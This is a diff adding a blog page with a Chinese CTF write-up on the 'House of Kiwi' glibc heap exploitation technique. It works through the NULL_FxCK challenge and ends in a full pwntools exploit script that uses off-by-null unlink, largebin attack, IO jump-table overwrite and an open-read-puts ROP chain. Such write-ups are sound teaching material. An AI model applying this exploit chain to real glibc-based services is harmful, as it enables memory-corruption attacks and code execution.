@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【IO_FILE】House of kiwi
+        </div>
+        <div class="post-meta">
+            2022-10-27
+        </div>
+        <div class="post-md">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>参考博客如下：</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-273746.htm">从PWN题NULL_FXCK中学到的glibc知识</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598">House OF Kiwi</a></p>
+</blockquote>
+<p>CTF的Pwn题里面,通常就会遇到一些加了沙盒的题目,这种加沙盒的题目,在2.29之后的堆题中,通常为以下两种方式</p>
+<ul>
+<li>劫持<code>__free_hook</code>,利用特定的gadget,将栈进行迁移</li>
+<li>劫持<code>__malloc_hook</code>为<code>setcontext+61</code>的gadget,以及劫持<code>IO_list_all</code>单链表中的指针在exit结束中,在<code>_IO_cleanup</code>函数会进行缓冲区的刷新,从而读取flag</li>
+</ul>
+<p>因为<code>setcontext + 61</code>从2.29之后变为由RDX寄存器控制寄存器了,所以需要控制RDX寄存器的指向的位置的部分数据</p>
+<pre><code class="assembly">&lt;setcontext+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]
+&lt;setcontext+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]
+&lt;setcontext+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]
+&lt;setcontext+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]
+&lt;setcontext+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]
+&lt;setcontext+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]
+&lt;setcontext+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]
+&lt;setcontext+95&gt;:    test   DWORD PTR fs:0x48,0x2
+&lt;setcontext+107&gt;:    je     0x7ffff7e31156 &lt;setcontext+294&gt;
+...
+&lt;setcontext+294&gt;:    mov    rcx,QWORD PTR [rdx+0xa8]
+&lt;setcontext+301&gt;:    push   rcx
+&lt;setcontext+302&gt;:    mov    rsi,QWORD PTR [rdx+0x70]
+&lt;setcontext+306&gt;:    mov    rdi,QWORD PTR [rdx+0x68]
+&lt;setcontext+310&gt;:    mov    rcx,QWORD PTR [rdx+0x98]
+&lt;setcontext+317&gt;:    mov    r8,QWORD PTR [rdx+0x28]
+&lt;setcontext+321&gt;:    mov    r9,QWORD PTR [rdx+0x30]
+&lt;setcontext+325&gt;:    mov    rdx,QWORD PTR [rdx+0x88]
+&lt;setcontext+332&gt;:    xor    eax,eax
+&lt;setcontext+334&gt;:    ret
+</code></pre>
+<p>但是如果将exit函数替换成<code>_exit</code>函数,最终结束的时候,则是进行了syscall来结束,并没有机会调用<code>_IO_cleanup</code>,若再将<code>__malloc_hook</code>和<code>__free_hook</code>给ban了,且在输入和输出都用read和write的情况下,无法hook且无法通过IO刷新缓冲区进行调用,这时候就涉及到ptmalloc源码里面了</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li>能够触发<code>_malloc_assert</code>，通常由堆溢出导致</li>
+<li>能够任意地址写，修改 <code>_IO_file_sync</code> 和<code>IO_helper_jumps + 0xA0 and 0xA8</code></li>
+</ul>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p><code>glibc</code>中<code>ptmalloc</code>部分,从以前到现在都存在一个<code>assret</code>断言的问题,此处存在一个<code>fflush(stderr)</code>的函数调用,其中会调用<code>_IO_file_jumps</code>中的<code>sync</code>指针</p>
+<blockquote>
+<p>GLibc 2.32&#x2F;malloc:288</p>
+</blockquote>
+<pre><code class="c">static void
+__malloc_assert (const char *assertion, const char *file, unsigned int line,
+       const char *function)
+&#123;
+(void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#39; failed.\n&quot;,
+           __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,
+           file, line,
+           function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,
+           assertion);
+fflush (stderr);
+abort ();
+&#125;
+</code></pre>
+<blockquote>
+<p> 这里放一个我常用来查询glibc源码的网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/latest/source">Glibc source code - Bootlin</a></p>
+</blockquote>
+<p><img src="/img/article/house_of_kiwi/image-20221026101620627-1666750587623-2.png" alt="image-20221026101620627"></p>
+<p>在<code>_int_malloc</code>中存在一个 assert (chunk_main_arena (bck-&gt;bk));位置可以触发,此外当<code>top_chunk</code>的大小不够分配时,则会进入sysmalloc中</p>
+<blockquote>
+<p>GLIBC 2.32&#x2F;malloc.c:2394</p>
+</blockquote>
+<pre><code class="c">......
+assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||
+        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
+         prev_inuse (old_top) &amp;&amp;
+         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));
+......
+</code></pre>
+<p>此处会对top_chunk的<code>size|flags</code>进行assert判断</p>
+<ul>
+<li>old_size &gt;&#x3D; 0x20;</li>
+<li>old_top.prev_inuse &#x3D; 0;</li>
+<li>old_top页对齐</li>
+</ul>
+<p>通过这里也可以触发assert<br>下面手动实现进入assert后,可以想到fflush和fxprintf都和IO有关,可能需要涉及IO,一步步调试看看可以发现在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且观察发现RDX寄存器的值为<code>IO_helper_jumps</code>指针,多次调试发现RDX始终是一个固定的地址</p>
+<p><img src="/img/article/house_of_kiwi/t01f675c08902cf9575.png" alt="img"></p>
+<p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p>
+<h2 id="例题介绍"><a href="#例题介绍" class="headerlink" title="例题介绍"></a>例题介绍</h2><blockquote>
+<p>以NepCTF 2021年中NULL_FxCK为例</p>
+</blockquote>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="沙箱开启"><a href="#沙箱开启" class="headerlink" title="沙箱开启"></a>沙箱开启</h4><p><img src="/img/article/house_of_kiwi/image-20221026134222730.png" alt="image-20221026134222730"></p>
+<h4 id="保护全开"><a href="#保护全开" class="headerlink" title="保护全开"></a>保护全开</h4><p><img src="/img/article/house_of_kiwi/image-20221026134910200.png" alt="image-20221026134910200"></p>
+<h4 id="禁用malloc-hook-free-hook"><a href="#禁用malloc-hook-free-hook" class="headerlink" title="禁用malloc_hook, free_hook"></a>禁用malloc_hook, free_hook</h4><p><img src="/img/article/house_of_kiwi/image-20221026135700420.png" alt="ban!!!"></p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><blockquote>
+<p>整个程序只有在modify里有一次off by null 的机会，无其他漏洞</p>
+</blockquote>
+<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>这里的思路其实有点公式化的味道，就和我们做数学题一样，都是通过题目给的条件来思考利用的手法。给了off_by_null就思考会用到堆块的合并导致的重叠。重叠带来的好处：</p>
+<ul>
+<li>通过切割堆块能使我们在合并的堆块内部任意地址写main_arena，这个任意地址可能是note数组的一个堆指针的fd，那么我们就可以泄露libc了</li>
+<li>合并的时候的unlink能使得我们在已知堆块的fd和bk上写一个堆地址，这样就可以弥补一开始的截断带来的不能泄露堆块，然后成功泄露出堆块了</li>
+</ul>
+<h4 id="堆风水泄露libc和堆地址"><a href="#堆风水泄露libc和堆地址" class="headerlink" title="堆风水泄露libc和堆地址"></a>堆风水泄露libc和堆地址</h4><p>首先伪造一个chunk头，利用off by null unlink吞并几个Allocated状态的chunk. 然后add分割使得chunk进入unsortedbin，从而泄露libc. 同时包含，largebin中提前包含heap信息，从而泄露heap地址</p>
+<h4 id="house-of-wiki"><a href="#house-of-wiki" class="headerlink" title="house of wiki"></a>house of wiki</h4><p>发现这题中的<code>exit</code>被换成了<code>_exit</code>，而<code>_exit</code>是不会存在<code>house of pig</code>里面的那条链子的，它直接就是一个<code>exit</code>的系统调用然后程序就结束了，所以任何打<code>exit</code>的链子都不能直接拿来用。遇到这种问题，有的师傅就开辟了一条名为<code>house of kiwi</code>的链子。主要是打<code>__malloc_assert</code>断言，有一个位于<code>_IO_file_jumps+0x60</code>的稳定的跳转指针<code>sync</code>和稳定的<code>rdx——_IO_helper_jumps</code>，而且这两个地方在gdb里都是有符号表的（比banana好找多了2333）：</p>
+<p><img src="/img/article/house_of_kiwi/image-20221026150024215.png" alt="偏移确定"></p>
+<p>那么我们通过两次任意地址写就行了？非也。因为还需要触发assert，看看malloc.c的源码，ctrl f输入”assert”。发现有80多个。这里介绍其中一种做法：当top_chunk的大小不够分配时,则会进入sysmalloc中</p>
+<pre><code class="c">assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||
+        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
+         prev_inuse (old_top) &amp;&amp;
+         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));
+</code></pre>
+<p>发现很多检测，我们注意到对topchunk的prev_inuse的检测，只要把topchunk的size位的prev_inuse置为0，申请一个比它大的堆块就可以触发了。我们发现，至少需要改三个地址，也就是执行三次任意地址写。从这道题的严苛条件，不能用tcache poison等简单手法。</p>
+<h4 id="TLS段tcache-struct-attack"><a href="#TLS段tcache-struct-attack" class="headerlink" title="TLS段tcache struct attack"></a>TLS段tcache struct attack</h4><p>我们都知道，malloc_init会在heapbase段开设一个内存用于管理tcache。而这个管理tcache的地址，是可以从heapbase被我们劫持到另一个地方的，这是因为实际寻找的时候，是找到TLS段的管理tcache的地址，只不过malloc_init函数预设成了heapbase+0x10而已（注意，是heapbase+0x10而不是heapbase），我们可以在gdb中找到这段区域：</p>
+<p><img src="/img/article/house_of_kiwi/image-20221026151700771.png" alt="image-20221026151700771"></p>
+<p>通过<code>largebin attack</code>劫持这段为可控堆块，在上面布置任何我们想写的东西，<code>malloc</code>对应位置size大小就能够申请出来并且改写了（这里的偏移要调一调，不过也可以拿exp的模板直接来用，也就是）</p>
+<p>通过改稳定的跳表sync为setcontext+61(因为setcontext会将[rdx+0xa0]设置为rsp，将[rdx+0xa8]设置为rip)，将稳定的rdx <code>_IO_helper_jumps</code>设置为<code>_IO_helper_jumps+0xa0</code>为存orw链，+0xa8为ret指令，并改top_chunk的size，然后申请一个比它的size大的堆块触发assert就可get_shell了</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
+<p>这道题考察了高版本的off_by_null，large bin attack，house of kiwi ， TLS attack</p>
+</blockquote>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python"># -*- encoding: utf-8 -*-
+import sys 
+import os 
+from pwn import * 
+context.log_level = &#39;debug&#39; 
+# context.update( os = &#39;linux&#39;, arch = &#39;amd64&#39;,timeout = 1)
+binary = &#39;./NULL_FXCK&#39;
+os.system(&#39;chmod +x %s&#39;%binary)
+elf = ELF(binary)
+libc = elf.libc
+# libc = ELF(&#39;&#39;)
+context.binary = binary
+DEBUG = 1
+if DEBUG:
+    p = process(binary)
+    libc = elf.libc
+    # p = process([&#39;qemu-arm&#39;, binary])
+    # p = process([&#39;qemu-arm&#39;, binary,&#39;-g&#39;,&#39;1234&#39;])
+    # p = process([&#39;qemu-aarch64&#39;,&#39;-L&#39;,&#39;&#39;,&#39;-g&#39;,&#39;1234&#39;,binary])
+else:
+    host = &#39;&#39;
+    port = &#39;&#39;
+    p = remote(host,port)
+
+l64 = lambda            : u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
+l32 = lambda            : u32(p.recvuntil(&#39;\xf7&#39;)[-4:].ljust(4,&#39;\x00&#39;))
+sla = lambda a,b        : p.sendlineafter(str(a),str(b))
+sa  = lambda a,b        : p.sendafter(str(a),str(b))
+lg  = lambda name,data  : p.success(name + &#39;: 0x%x&#39; % data)
+se  = lambda payload    : p.send(payload)
+rl  = lambda            : p.recv()
+sl  = lambda payload    : p.sendline(payload)
+ru  = lambda a          : p.recvuntil(str(a))
+rint= lambda x = 12     : int( p.recv(x) , 16)
+
+def dbg( b = null):
+    if (b == null):
+        gdb.attach(p)
+        pause()
+    else:
+        gdb.attach(p,&#39;b %s&#39;%b)
+
+def one_gadget(filename):
+    log.progress(&#39;Leak One_Gadgets...&#39;)
+    one_ggs = str(subprocess.check_output(
+        [&#39;one_gadget&#39;,&#39;--raw&#39;, &#39;-f&#39;,filename]
+    )).split(&#39; &#39;)
+    return list(map(int,one_ggs))
+
+def cmd(num):
+    sla(&#39;&gt;&gt;&#39;,num)
+
+def add(size , Content = &#39;\x00&#39;):
+    cmd(1)
+    sla(&#39;Size: &#39; , size)
+    sa(&#39;Content:&#39; , Content)
+
+def edit(idx , Content):
+    cmd(2)
+    sla(&#39;Index: &#39; , idx)
+    sla(&#39;Content:&#39; , Content)
+
+def delete(idx ):
+    cmd(3)
+    sla(&#39;Index: &#39; , idx)
+
+def show(idx ):
+    cmd(4)
+    sla(&#39;Index: &#39; , idx)
+
+
+# one_gad = one_gadget(libc.path)
+# 本质是通过 unsorted bin 或者 large bin 的指针残留构造 unlink 的指针指向
+
+add(0x418)
+add(0x108)
+add(0x418) #2
+add(0x438) #3
+add(0x208) #4
+add(0x428) #5
+add(0x418) #6
+
+delete(0)
+delete(3)
+delete(5)
+
+delete(2)
+
+# unsorted bin 合并 ，但合并不会清空数据，某处有残留的堆地址
+
+add(0x438, &#39;a&#39; * 0x418 +  p64( 0x420 + 0x210 + 0x430 + 0x420 + 0x20 + 1)) #0
+
+# 0xa91 写到了原来 chunk3 的 size 处，刚好这下面有残留的堆地址
+# 切割已经合并的大块
+# unsorted bin 从新到旧排序
+
+add(0x418) #2
+add(0x428) #3
+add(0x418) #5
+
+# 下面构造 fack fd 
+delete(5)
+delete(2)
+add(0x418 , &#39;a&#39;*9) #2
+add(0x418) #5
+
+# 下面构造 fack bk
+
+delete(5)
+delete(3)
+
+add(0x9f8) #3
+add(0x428 , &#39;a&#39;) #5
+add(0x418) #7
+
+# 下面进行 unlink
+add(0x408, p64(0) + p64(0x411)) #8
+edit(6, &#39;a&#39; * 0x410 + p64(0x210 +0x430 + 0x420 + 0x420 + 0x20 ))
+delete(3)
+
+add(0x438 , flat(0 , 0 ,0 , 0x421)) #3
+add(0x1600) #9
+
+show(4)
+__malloc_hook = l64() - 1644 - 0x40 - 4
+libc.address = __malloc_hook - libc.sym[&#39;__malloc_hook&#39;]
+_environ = libc.sym[&#39;_environ&#39;]
+mp_ = libc.address + 0x1e3280
+_IO_list_all = libc.sym[&#39;_IO_list_all&#39;]
+_IO_str_jumps = libc.address + 0x1e5580
+_IO_file_jumps = libc.address + 0x1e54c0
+_IO_helper_jumps = libc.address + 0x1e48c0
+setcontext = libc.sym[&#39;setcontext&#39;] + 61
+
+show(5)
+heap_base = u64(p.recv(6).ljust( 8 , &#39;\x00&#39;)) - 0x2b0
+
+ptr_list = 0x4160
+lg(&#39;__malloc_hook&#39; , __malloc_hook)
+lg(&#39;heap_base&#39;,heap_base)
+
+# ptr_list = $rebase(0x000000000004160)
+
+add(0x1458 , flat(&#39;\x00&#39;*0x208 , 0x431 , &#39;\x00&#39;*0x428 , 0x421 , &#39;\x00&#39;*0x418 , 0xa01) )
+
+delete(4)
+delete(5)
+
+add(0x1458  )
+add(0x448)
+
+delete(4)
+add(0x1458 , flat(&#39;\x00&#39;*0x208 , 0x431 , __malloc_hook + 0x460,__malloc_hook + 0x460 , 0 , _IO_list_all - 0x20 ) )
+
+delete(2)
+add(0x448)
+add(0x418)
+
+delete(0)
+add(0x438 , &#39;\x00&#39;*0x2c0 + p64(_IO_file_jumps + 96) + &#39;\x00&#39;*0x98 + flat(_IO_helper_jumps + 0xa0 , heap_base + 0x4bb0 ) ) #设置 entry
+
+delete(4)
+add(0x1458 , flat(&#39;\x00&#39;*0x208 , 0x431 , __malloc_hook + 0x460,__malloc_hook + 0x460 , 0 , mp_ + 80 - 0x20 ) )
+delete(11)
+
+
+read_addr = libc.sym[&#39;read&#39;]
+open_addr = libc.sym[&#39;open&#39;]
+puts_addr = libc.sym[&#39;puts&#39;]
+leave_ret = libc.search(asm(&#39;leave;ret&#39;)).next()
+pop_rax_ret = libc.search(asm(&#39;pop rax; ret&#39;)).next()
+pop_rdi_ret = libc.search(asm(&#39;pop rdi; ret&#39;)).next()
+pop_rsi_ret = libc.search(asm(&#39;pop rsi; ret&#39;)).next()
+pop_rdx_pop_rbx_ret = libc.search(asm(&#39;pop rdx ; pop rbx ; ret&#39;)).next()
+ret = pop_rdi_ret + 1
+
+flag_addr = heap_base + 0x4770 + 0x100
+chain = flat(
+    pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
+    pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
+    pop_rdi_ret , flag_addr , puts_addr
+).ljust(0x100,&#39;\x00&#39;) + &#39;flag\x00&#39;
+# len chain 0x80
+
+# dbg()
+add(0x448 , chain) # copy
+add(0x418)
+
+# House of kiwi 三大条件
+
+
+add(0x1450 , p64(setcontext)[:-1])
+
+add(0x1590 , flat( heap_base + 0x4770 , ret ))
+add(0x15a0 , flat( 0 , 0x3e0))
+# 0x1450 0x1590 0x15a0
+# dbg()
+
+# dbg()
+cmd(1)
+sla(&#39;Size&#39; , 0x1000)
+
+p.interactive()
+</code></pre>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
